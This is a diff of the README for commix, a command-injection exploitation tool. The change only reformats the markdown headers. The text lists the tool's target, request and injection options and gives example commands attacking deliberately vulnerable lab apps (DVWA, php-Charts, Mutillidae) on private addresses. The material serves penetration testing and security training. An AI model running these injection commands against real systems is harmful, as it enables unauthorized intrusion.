@@ -32,22 +32,20 @@ Download commix by cloning the Git repository:
 #Usage
     Usage: python commix.py [options]
 
-####Options:
-
+####Options
     -h, --help            Show help and exit.
     --verbose             Enable the verbose mode.
     --install             Install 'commix' to your system.
     --version             Show version number and exit.
     --update              Check for updates (apply if any) and exit.
 
-####Target:
+####Target
     This options has to be provided, to define the target URL.
 
     --url=URL           Target URL.
     --url-reload        Reload target URL after command execution.
 
-####Request:
-
+####Request
     These options can be used, to specify how to connect to the target
     URL.
 
@@ -61,9 +59,7 @@ Download commix by cloning the Git repository:
     --auth-data=AUTH..  Login parameters and data.
     --auth-cred=AUTH..  HTTP Basic Authentication credentials (e.g.
                         'admin:admin').
-
-####Injection:
-
+####Injection
     These options can be used, to specify which parameters to inject and
     to provide custom injection payloads.
 
@@ -78,16 +74,15 @@ Download commix by cloning the Git repository:
                         techniques (Default: 1 sec).
     --base64            Use Base64 (enc)/(de)code trick to prevent false-
                         positive results.
-
-####Usage Examples:
-**Exploiting Damn Vulnerable Web App :**
+####Usage Examples
+**Exploiting Damn Vulnerable Web App **
 
     python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
     
-**Exploiting php-Charts 1.0 *(using injection payload suffix & prefix string)* :**
+**Exploiting php-Charts 1.0 *(using injection payload suffix & prefix string)* **
 
     python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE" --prefix="//" --suffix="'" 
     
-**Exploiting OWASP Mutillidae *(using Extra headers and HTTP proxy)* :**
+**Exploiting OWASP Mutillidae *(using Extra headers and HTTP proxy)* **
 
     python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php" --data="target_host=INJECT_HERE" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"
